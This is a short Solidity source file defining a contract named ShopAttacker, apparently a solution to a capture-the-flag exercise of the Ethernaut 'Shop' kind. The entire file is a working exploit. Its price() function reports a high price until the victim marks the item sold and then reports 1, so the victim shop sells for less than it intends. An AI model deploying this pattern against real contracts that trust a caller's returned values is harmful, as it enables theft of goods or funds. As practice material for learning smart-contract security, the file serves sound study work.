// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface IShop {
    function buy() external;

    function isSold() external returns (bool);
}

contract ShopAttacker {
    IShop public victim;

    constructor(address _victimAddress) {
        victim = IShop(_victimAddress);
    }

    function price() external returns (uint256) {
        return victim.isSold() ? 1 : 100;
    }

    function attack() external {
        victim.buy();
    }
}
